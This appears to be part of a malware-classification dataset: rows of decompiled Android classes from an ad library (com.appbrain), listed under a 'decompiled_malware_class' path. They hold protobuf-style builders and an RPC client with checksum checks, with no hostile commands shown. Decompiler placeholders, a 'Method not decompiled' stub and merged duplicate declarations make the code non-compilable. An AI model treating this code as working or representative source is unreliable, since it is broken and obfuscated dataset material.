this.a|=android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY;     this.l=i;     return this;   }   public final C0016a a(  long j){     this.a|=1;     this.c=j;     return this;   }   public final C0016a a(  com.appbrain.b.c cVar){     if (cVar == null) {       throw new NullPointerException();     }     this.b|=2;     this.J=cVar;     return this;   }   public final C0016a a(  a aVar){     if (aVar != a.f()) {       if (aVar.g()) {         a(aVar.h());       }       if (aVar.i()) {         b(aVar.j());       }       if (aVar.k()) {         this.a|=4;         this.e=aVar.g;       }       if (aVar.l()) {         this.a|=8;         this.f=aVar.h;       }       if (aVar.m()) {         this.a|=16;         this.g=aVar.i;       }       if (aVar.n()) {         this.a|=32;         this.h=aVar.j;       }       if (aVar.o()) {         this.a|=64;         this.i=aVar.k;       }       if (aVar.p()) {         this.a|=android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS;         this.j=aVar.l;       }       if (aVar.q()) {         this.a|=android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;         this.k=aVar.m;       }       if (aVar.r()) {         a(aVar.s());       }       if (aVar.t()) {         b(aVar.u());       }       if (aVar.v()) {         this.a|=android.support.v4.view.a.a.ACTION_PREVIOUS_HTML_ELEMENT;         this.n=aVar.p;       }       if (aVar.w()) {         this.a|=4096;         this.o=aVar.q;       }       if (aVar.x()) {         this.a|=8192;         this.p=aVar.r;       }       if (aVar.y()) {         this.a|=16384;         this.q=aVar.s;       }       if (aVar.z()) {         this.a|=32768;         this.r=aVar.t;       }       if (aVar.A()) {         this.a|=65536;         this.s=aVar.u;       }       if (aVar.B()) {         this.a|=131072;         this.t=aVar.v;       }       if (aVar.C()) {         c(aVar.D());       }       if (aVar.E()) {         this.a|=524288;         this.v=aVar.x;       }       if (aVar.F()) {         d(aVar.G());       }       if (aVar.H()) {         e(aVar.I());       }       if (aVar.J()) {         c(aVar.K());       }       if (aVar.L()) {         f(aVar.M());       }       if (aVar.N()) {         g(aVar.O());       }       if (aVar.P()) {         h(aVar.Q());       }       if (aVar.R()) {         i(aVar.S());       }       if (aVar.T()) {         j(aVar.U());       }       if (aVar.V()) {         k(aVar.W());       }       if (aVar.X()) {         l(aVar.Y());       }       if (aVar.Z()) {         this.a|=1073741824;         this.G=aVar.I;       }       if (aVar.aa()) {         m(aVar.ab());       }       if (aVar.ac()) {         this.b|=1;         this.I=aVar.K;       }       if (aVar.ad()) {         a(aVar.ae());       }       if (aVar.af()) {         b(aVar.ag());       }       if (aVar.ah()) {         n(aVar.ai());       }       if (aVar.aj()) {         o(aVar.ak());       }       if (aVar.al()) {         d(aVar.am());       }     }     return this;   }   public final C0016a a(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=4;     this.e=str;     return this;   }   public final C0016a b(  int i){     this.a|=android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT;     this.m=i;     return this;   }   public final C0016a b(  long j){     this.a|=2;     this.d=j;     return this;   }   public final C0016a b(  com.appbrain.b.c cVar){     if (cVar == null) {       throw new NullPointerException();     }     this.b|=4;     this.K=cVar;     return this;   }   public final C0016a b(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=8;     this.f=str;     return this;   }   public final C0016a c(  int i){     this.a|=262144;     this.u=i;     return this;   }   public final C0016a c(  long j){     this.a|=4194304;     this.y=j;     return this;   }   public final C0016a c(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=16;     this.g=str;     return this;   }   public final C0016a d(  int i){     this.a|=1048576;     this.w=i;     return this;   }   public final C0016a d(  long j){     this.b|=32;     this.N=j;     return this;   }   public final C0016a d(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=32;     this.h=str;     return this;   }   @Override public final a c(){     a f=f();     if (f.e()) {       return f;     }     throw new com.appbrain.b.q();   }   public final C0016a e(  int i){     this.a|=2097152;     this.x=i;     return this;   }   public final C0016a e(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=64;     this.i=str;     return this;   }   @Override public final boolean e(){     return true;   }   public final C0016a f(  int i){     this.a|=8388608;     this.z=i;     return this;   }   public final C0016a f(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS;     this.j=str;     return this;   }   public final a f(){     a aVar=new a((char)0);     int i=this.a;     int i2=this.b;     int i3=(i & 1) == 1 ? 1 : 0;     aVar.e=this.c;     if ((i & 2) == 2) {       i3|=2;     }     aVar.f=this.d;     if ((i & 4) == 4) {       i3|=4;     }     aVar.g=this.e;     if ((i & 8) == 8) {       i3|=8;     }     aVar.h=this.f;     if ((i & 16) == 16) {       i3|=16;     }     aVar.i=this.g;     if ((i & 32) == 32) {       i3|=32;     }     aVar.j=this.h;     if ((i & 64) == 64) {       i3|=64;     }     aVar.k=this.i;     if ((i & android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS) == 128) {       i3|=android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS;     }     aVar.l=this.j;     if ((i & android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY) == 256) {       i3|=android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;     }     aVar.m=this.k;     if ((i & android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY) == 512) {       i3|=android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY;     }     aVar.n=this.l;     if ((i & android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT) == 1024) {       i3|=android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT;     }     aVar.o=this.m;     if ((i & android.support.v4.view.a.a.ACTION_PREVIOUS_HTML_ELEMENT) == 2048) {       i3|=android.support.v4.view.a.a.ACTION_PREVIOUS_HTML_ELEMENT;     }     aVar.p=this.n;     if ((i & 4096) == 4096) {       i3|=4096;     }     aVar.q=this.o;     if ((i & 8192) == 8192) {       i3|=8192;     }     aVar.r=this.p;     if ((i & 16384) == 16384) {       i3|=16384;     }     aVar.s=this.q;     if ((i & 32768) == 32768) {       i3|=32768;     }     aVar.t=this.r;     if ((i & 65536) == 65536) {       i3|=65536;     }     aVar.u=this.s;     if ((131072 & i) == 131072) {       i3|=131072;     }     aVar.v=this.t;     if ((262144 & i) == 262144) {       i3|=262144;     }     aVar.w=this.u;     if ((524288 & i) == 524288) {       i3|=524288;     }     aVar.x=this.v;     if ((1048576 & i) == 1048576) {       i3|=1048576;     }     aVar.y=this.w;     if ((2097152 & i) == 2097152) {       i3|=2097152;     }     aVar.z=this.x;     if ((4194304 & i) == 4194304) {       i3|=4194304;     }     aVar.A=this.y;     if ((8388608 & i) == 8388608) {       i3|=8388608;     }     aVar.B=this.z;     if ((16777216 & i) == 16777216) {       i3|=16777216;     }     aVar.C=this.A;     if ((33554432 & i) == 33554432) {       i3|=33554432;     }     aVar.D=this.B;     if ((67108864 & i) == 67108864) {       i3|=67108864;     }     aVar.E=this.C;     if ((134217728 & i) == 134217728) {       i3|=134217728;     }     aVar.F=this.D;     if ((268435456 & i) == 268435456) {       i3|=268435456;     }     aVar.G=this.E;     if ((536870912 & i) == 536870912) {       i3|=536870912;     }     aVar.H=this.F;     if ((1073741824 & i) == 1073741824) {       i3|=1073741824;     }     aVar.I=this.G;     if ((i & Integer.MIN_VALUE) == Integer.MIN_VALUE) {       i3|=Integer.MIN_VALUE;     }     aVar.J=this.H;     int i4=(i2 & 1) != 1 ? 0 : 1;     aVar.K=this.I;     if ((i2 & 2) == 2) {       i4|=2;     }     aVar.L=this.J;     if ((i2 & 4) == 4) {       i4|=4;     }     aVar.M=this.K;     if ((i2 & 8) == 8) {       i4|=8;     }     aVar.N=this.L;     if ((i2 & 16) == 16) {       i4|=16;     }     aVar.O=this.M;     if ((i2 & 32) == 32) {       i4|=32;     }     aVar.P=this.N;     aVar.c=i3;     aVar.d=i4;     return aVar;   }   public final C0016a g(  int i){     this.a|=16777216;     this.A=i;     return this;   }   public final C0016a g(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;     this.k=str;     return this;   }   public final C0016a h(  int i){     this.a|=33554432;     this.B=i;     return this;   }   public final C0016a h(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=4096;     this.o=str;     return this;   }   public final C0016a i(  int i){     this.a|=67108864;     this.C=i;     return this;   }   public final C0016a i(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=8192;     this.p=str;     return this;   }   public final C0016a j(  int i){     this.a|=134217728;     this.D=i;     return this;   }   public final C0016a j(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=16384;     this.q=str;     return this;   }   public final C0016a k(  int i){     this.a|=268435456;     this.E=i;     return this;   }   public final C0016a k(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=32768;     this.r=str;     return this;   }   public final C0016a l(  int i){     this.a|=536870912;     this.F=i;     return this;   }   public final C0016a l(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=65536;     this.s=str;     return this;   }   public final C0016a m(  int i){     this.a|=Integer.MIN_VALUE;     this.H=i;     return this;   }   public final C0016a m(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=131072;     this.t=str;     return this;   }   public final C0016a n(  int i){     this.b|=8;     this.L=i;     return this;   }   public final C0016a n(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=524288;     this.v=str;     return this;   }   public final C0016a o(  int i){     this.b|=16;     this.M=i;     return this;   }   public final C0016a o(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=1073741824;     this.G=str;     return this;   }   public final C0016a p(  String str){     if (str == null) {       throw new NullPointerException();     }     this.b|=1;     this.I=str;     return this;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\d.code","public interface d extends com.appbrain.b.n { } final class d extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new a.e(dVar,fVar,(byte)0);   } } public static final class d extends com.appbrain.b.g implements e {   public static com.appbrain.b.o a=new com.appbrain.e.m();   private static final d b;   private int c;   private Object d;   private long e;   private com.appbrain.b.k f;   private byte g;   private int h; public static final class a extends g.a implements e {     private int a;     private long c;     private Object b="""";     private com.appbrain.b.k d=com.appbrain.b.j.a;     private a(){     }     static a d(){       return new a();     }     @Override public a clone(){       return new a().a(g());     }     private d g(){       d dVar=new d((char)0);       int i=this.a;       int i2=(i & 1) != 1 ? 0 : 1;       dVar.d=this.b;       if ((i & 2) == 2) {         i2|=2;       }       dVar.e=this.c;       if ((this.a & 4) == 4) {         this.d=new com.appbrain.b.r(this.d);         this.a&=-5;       }       dVar.f=this.d;       dVar.c=i2;       return dVar;     }     public final a a(    d dVar){       if (dVar != d.f()) {         if (dVar.g()) {           this.a|=1;           this.b=dVar.d;         }         if (dVar.i()) {           long j=dVar.j();           this.a|=2;           this.c=j;         }         if (!dVar.f.isEmpty()) {           if (this.d.isEmpty()) {             this.d=dVar.f;             this.a&=-5;           }  else {             if ((this.a & 4) != 4) {               this.d=new com.appbrain.b.j(this.d);               this.a|=4;             }             this.d.addAll(dVar.f);           }         }       }       return this;     }     @Override public final com.appbrain.b.m c(){       d g=g();       if (g.e()) {         return g;       }       throw new com.appbrain.b.q();     }     @Override public final boolean e(){       return true;     }   } static {     d dVar=new d((byte)0);     b=dVar;     dVar.l();   }   private d(){     super((byte)0);     this.g=(byte)-1;     this.h=-1;   }   private d(  byte b2){     this.g=(byte)-1;     this.h=-1;   }   d(  char c){     this();   }   private d(  com.appbrain.b.d r8){     throw new UnsupportedOperationException(""Method not decompiled: com.appbrain.e.j.d.<init>(com.appbrain.b.d):void"");   }   public d(  com.appbrain.b.d dVar,  byte b2){     this(dVar);   }   public static d f(){     return b;   }   private com.appbrain.b.c k(){     Object obj=this.d;     if (!(obj instanceof String)) {       return (com.appbrain.b.c)obj;     }     com.appbrain.b.c a2=com.appbrain.b.c.a((String)obj);     this.d=a2;     return a2;   }   private void l(){     this.d="""";     this.e=0L;     this.f=com.appbrain.b.j.a;   }   @Override public final void a(  com.appbrain.b.e eVar){     c();     if ((this.c & 1) == 1) {       eVar.a(1,k());     }     if ((this.c & 2) == 2) {       eVar.a(2,this.e);     }     for (int i=0; i < this.f.size(); i++) {       eVar.a(3,this.f.a(i));     }   }   @Override public final int c(){     int i=this.h;     if (i != -1) {       return i;     }     int b2=(this.c & 1) == 1 ? com.appbrain.b.e.b(1,k()) + 0 : 0;     if ((this.c & 2) == 2) {       b2+=com.appbrain.b.e.b(2,this.e);     }     int i2=0;     for (int i3=0; i3 < this.f.size(); i3++) {       i2+=com.appbrain.b.e.a(this.f.a(i3));     }     int size=b2 + i2 + (this.f.size() * 1);     this.h=size;     return size;   }   @Override public final m.a d(){     return a.d().a(this);   }   @Override public final boolean e(){     byte b2=this.g;     if (b2 != -1) {       return b2 == 1;     }     this.g=(byte)1;     return true;   }   public final boolean g(){     return (this.c & 1) == 1;   }   public final String h(){     Object obj=this.d;     if (obj instanceof String) {       return (String)obj;     }     com.appbrain.b.c cVar=(com.appbrain.b.c)obj;     String e=cVar.e();     if (cVar.f()) {       this.d=e;     }     return e;   }   public final boolean i(){     return (this.c & 2) == 2;   }   public final long j(){     return this.e;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@58768febfinal class e extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new a.g(dVar,fVar,(byte)0);   } } public interface e extends com.appbrain.b.n { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\f.code","public interface f extends com.appbrain.b.n { } final class f extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new a.i(dVar,(byte)0);   } } !org.eclipse.jdt.core.dom.TypeDeclaration@546167af"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\g.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5ac30d51final class g extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new a.k(dVar,fVar,(byte)0);   } } public interface g extends com.appbrain.b.n { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\h.code","public interface h extends com.appbrain.b.n { } !org.eclipse.jdt.core.dom.TypeDeclaration@71850179"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\i.code","!org.eclipse.jdt.core.dom.TypeDeclaration@631c3042final class i extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new h.a(dVar,(byte)0);   } } !org.eclipse.jdt.core.dom.TypeDeclaration@1289705c"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\InterfaceC0017j.code","public interface InterfaceC0017j extends com.appbrain.b.n { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\j.code","public interface j extends com.appbrain.b.n { } !org.eclipse.jdt.core.dom.TypeDeclaration@4085d668"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\k.code","!org.eclipse.jdt.core.dom.TypeDeclaration@66437013!org.eclipse.jdt.core.dom.TypeDeclaration@45cb2e6ffinal class k implements h.a { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\l.code","public interface l extends com.appbrain.b.n { } public interface l extends com.appbrain.b.n { } final class l extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new j.b(dVar,fVar,(byte)0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\m.code","!org.eclipse.jdt.core.dom.TypeDeclaration@70bad819final class m extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new j.d(dVar,(byte)0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\n.code","public interface n extends com.appbrain.b.n {   i h();   int l(); } final class n extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new j.f(dVar,fVar,(byte)0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\o.code","final class o implements h.a { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\p.code","final class p extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new j.i(dVar,fVar,(byte)0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\q.code","final class q extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new j.k(dVar,fVar,(byte)0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\r.code","final class r extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new j.m(dVar,fVar,(byte)0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.f\a.code","public abstract class a implements d.a {   private final a.c a;   public a(  a.c cVar){     this.a=cVar;   }   public static long a(  byte[]... bArr){     MessageDigest a=a();     for (    byte[] bArr2 : bArr) {       a.update(bArr2);     }     return ByteBuffer.wrap(a.digest()).getLong();   }   private static MessageDigest a(){     try {       return MessageDigest.getInstance(""SHA-1"");     }  catch (    NoSuchAlgorithmException e) {       throw new RuntimeException(e);     }   }   protected abstract long a(  byte[] bArr);   @Override public final a.C0018a a(  a.C0018a.C0019a c0019a){     a.C0018a.C0019a clone=c0019a.clone();     clone.a(a(clone.c().b()));     clone.a(this.a);     return clone.c();   }   @Override public final void a(  a.C0018a c0018a){     if (c0018a.o() != this.a) {       throw new SecurityException(""Unexpected sign-type: "" + c0018a.o());     }     a.C0018a.C0019a d=c0018a.d();     d.g();     d.h();     long a=a(d.c().b());     if (a != c0018a.m()) {       throw new SecurityException(""Wrong checksum value. "" + a + "" ""+ c0018a.m()+ "", wrapper:\n""+ c0018a);     }   } } public interface a {   m a();   int b(); } public interface a {   a.C0018a a(  a.C0018a.C0019a c0019a);   void a(  a.C0018a c0018a); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.f\b.code","public final class b extends a {   public b(){     super(a.c.INTEGRITY_ONLY);   }   @Override protected final long a(  byte[] bArr){     return a(bArr);   } } public static class b {   public final byte[] a;   public final String b;   private b(  byte[] bArr,  String str){     this.a=bArr;     this.b=str;   }   public static b a(  a.C0018a c0018a){     return new b(c0018a.u() ? null : c0018a.i().d(),c0018a.q() ? c0018a.s().length() > 0 ? c0018a.s() : ""There was an error contacting the server."" : null);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.f\c.code","public class c {   protected Context a;   private cmn.c c;   private final d b=new d(new com.appbrain.f.b());   private final List d=new ArrayList(); public interface a {     m a();     int b();   } public static class b {     public final byte[] a;     public final String b;     private b(    byte[] bArr,    String str){       this.a=bArr;       this.b=str;     }     public static b a(    a.C0018a c0018a){       return new b(c0018a.u() ? null : c0018a.i().d(),c0018a.q() ? c0018a.s().length() > 0 ? c0018a.s() : ""There was an error contacting the server."" : null);     }   }   public c(  Context context){     this.a=context.getApplicationContext();   }   protected a.C0018a.C0019a a(  g gVar,  String str){     a.C0018a.C0019a H=a.C0018a.H();     H.a(com.appbrain.b.c.a(gVar.b()));     H.a(str);     H.a(s.a(this.a).f());     for (    a aVar : this.d) {       m a2=aVar.a();       if (a2 != null) {         H.b(a2.a());         H.b(aVar.b());       }     }     return H;   }   public final void a(  c.a aVar){     this.c=new cmn.c(aVar);   }   public byte[] b(  g gVar,  String str){     b bVar;     if (str.indexOf(36) != -1) {       str=str.substring(str.lastIndexOf(36) + 1);     }     byte[] a2=this.c.a(str,this.b.a(a(gVar,str)).b());     if (a2 == null) {       bVar=null;     }  else {       a.C0018a a3=a.C0018a.a(a2);       this.b.a(a3);       b a4=b.a(a3);       if (a3.G() != 0) {         if (a3.G() != a3.F()) {           Log.e(""RPC"",""RPC extension count not matching "" + a3.G() + "" ""+ a3.F());         }  else {           SparseArray sparseArray=new SparseArray(a3.G());           for (int i=0; i < a3.G(); i++) {             sparseArray.put(a3.a(i),a3.b(i));           }           Iterator it=this.d.iterator();           while (it.hasNext()) {             sparseArray.get(((a)it.next()).b());           }         }       }       bVar=a4;     }     if (bVar.b != null) {       throw new com.appbrain.c.a(bVar.b);     }     return bVar.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.f\d.code","public final class d {   private final a a;   private final b b=new b(); public interface a {     a.C0018a a(    a.C0018a.C0019a c0019a);     void a(    a.C0018a c0018a);   }   public d(  a aVar){     this.a=aVar;   }   public final a.C0018a a(  a.C0018a.C0019a c0019a){     return this.a.a(c0019a);   }   public final void a(  a.C0018a c0018a){     if (c0018a.o() == a.c.INTEGRITY_ONLY) {       this.b.a(c0018a);     }  else {       this.a.a(c0018a);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.g\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@e4ffdf"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.g\b.code","public interface b extends n { } final class b extends com.appbrain.b.b {   @Override public final Object a(  d dVar,  f fVar){     return new a.C0018a(dVar,(byte)0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.g\c.code","final class c implements h.a { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.g\C0018a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7655d50"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.g\C0019a.code","public static final class C0019a extends g.a implements b {   private int a;   private long e;   private boolean g;   private boolean i;   private boolean j;   private int p;   private Object b="""";   private com.appbrain.b.c c=com.appbrain.b.c.a;   private com.appbrain.b.c d=com.appbrain.b.c.a;   private c f=c.INTEGRITY_ONLY;   private Object h="""";   private Object k="""";   private Object l="""";   private Object m="""";   private Object n="""";   private Object o="""";   private Object q="""";   private List r=Collections.emptyList();   private List s=Collections.emptyList();   private C0019a(){   }   static C0019a i(){     return new C0019a();   }   private C0018a j(){     C0018a c0018a=new C0018a((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     c0018a.d=this.b;     if ((i & 2) == 2) {       i2|=2;     }     c0018a.e=this.c;     if ((i & 4) == 4) {       i2|=4;     }     c0018a.f=this.d;     if ((i & 8) == 8) {       i2|=8;     }     c0018a.g=this.e;     if ((i & 16) == 16) {       i2|=16;     }     c0018a.h=this.f;     if ((i & 32) == 32) {       i2|=32;     }     c0018a.i=this.g;     if ((i & 64) == 64) {       i2|=64;     }     c0018a.j=this.h;     if ((i & android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS) == 128) {       i2|=android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS;     }     c0018a.k=this.i;     if ((i & android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY) == 256) {       i2|=android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;     }     c0018a.l=this.j;     if ((i & android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY) == 512) {       i2|=android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY;     }     c0018a.m=this.k;     if ((i & android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT) == 1024) {       i2|=android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT;     }     c0018a.n=this.l;     if ((i & android.support.v4.view.a.a.ACTION_PREVIOUS_HTML_ELEMENT) == 2048) {       i2|=android.support.v4.view.a.a.ACTION_PREVIOUS_HTML_ELEMENT;     }     c0018a.o=this.m;     if ((i & 4096) == 4096) {       i2|=4096;     }     c0018a.p=this.n;     if ((i & 8192) == 8192) {       i2|=8192;     }     c0018a.q=this.o;     if ((i & 16384) == 16384) {       i2|=16384;     }     c0018a.r=this.p;     if ((i & 32768) == 32768) {       i2|=32768;     }     c0018a.s=this.q;     if ((this.a & 65536) == 65536) {       this.r=Collections.unmodifiableList(this.r);       this.a&=-65537;     }     c0018a.t=this.r;     if ((this.a & 131072) == 131072) {       this.s=Collections.unmodifiableList(this.s);       this.a&=-131073;     }     c0018a.u=this.s;     c0018a.c=i2;     return c0018a;   }   private void k(){     if ((this.a & 65536) != 65536) {       this.r=new ArrayList(this.r);       this.a|=65536;     }   }   private void l(){     if ((this.a & 131072) != 131072) {       this.s=new ArrayList(this.s);       this.a|=131072;     }   }   public final C0019a a(  int i){     this.a|=16384;     this.p=i;     return this;   }   public final C0019a a(  long j){     this.a|=8;     this.e=j;     return this;   }   public final C0019a a(  com.appbrain.b.c cVar){     if (cVar == null) {       throw new NullPointerException();     }     this.a|=2;     this.c=cVar;     return this;   }   public final C0019a a(  C0018a c0018a){     if (c0018a != C0018a.f()) {       if (c0018a.g()) {         this.a|=1;         this.b=c0018a.d;       }       if (c0018a.h()) {         a(c0018a.i());       }       if (c0018a.j()) {         com.appbrain.b.c k=c0018a.k();         if (k == null) {           throw new NullPointerException();         }         this.a|=4;         this.d=k;       }       if (c0018a.l()) {         a(c0018a.m());       }       if (c0018a.n()) {         a(c0018a.o());       }       if (c0018a.p()) {         boolean q=c0018a.q();         this.a|=32;         this.g=q;       }       if (c0018a.r()) {         this.a|=64;         this.h=c0018a.j;       }       if (c0018a.t()) {         boolean u=c0018a.u();         this.a|=android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS;         this.i=u;       }       if (c0018a.v()) {         boolean w=c0018a.w();         this.a|=android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;         this.j=w;       }       if (c0018a.x()) {         this.a|=android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY;         this.k=c0018a.m;       }       if (c0018a.y()) {         this.a|=android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT;         this.l=c0018a.n;       }       if (c0018a.z()) {         this.a|=android.support.v4.view.a.a.ACTION_PREVIOUS_HTML_ELEMENT;         this.m=c0018a.o;       }       if (c0018a.A()) {         this.a|=4096;         this.n=c0018a.p;       }       if (c0018a.B()) {         this.a|=8192;         this.o=c0018a.q;       }       if (c0018a.C()) {         a(c0018a.D());       }       if (c0018a.E()) {         this.a|=32768;         this.q=c0018a.s;       }       if (!c0018a.t.isEmpty()) {         if (this.r.isEmpty()) {           this.r=c0018a.t;           this.a&=-65537;         }  else {           k();           this.r.addAll(c0018a.t);         }       }       if (!c0018a.u.isEmpty()) {         if (this.s.isEmpty()) {           this.s=c0018a.u;           this.a&=-131073;         }  else {           l();           this.s.addAll(c0018a.u);         }       }     }     return this;   }   public final C0019a a(  c cVar){     if (cVar == null) {       throw new NullPointerException();     }     this.a|=16;     this.f=cVar;     return this;   }   public final C0019a a(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=1;     this.b=str;     return this;   }   public final C0019a b(  int i){     k();     this.r.add(Integer.valueOf(i));     return this;   }   public final C0019a b(  com.appbrain.b.c cVar){     if (cVar == null) {       throw new NullPointerException();     }     l();     this.s.add(cVar);     return this;   }   @Override public final C0019a clone(){     return new C0019a().a(j());   }   @Override public final boolean e(){     return true;   }   @Override public final C0018a c(){     C0018a j=j();     if (j.e()) {       return j;     }     throw new q();   }   public final C0019a g(){     this.a&=-9;     this.e=0L;     return this;   }   public final C0019a h(){     this.a&=-17;     this.f=c.INTEGRITY_ONLY;     return this;   } } "
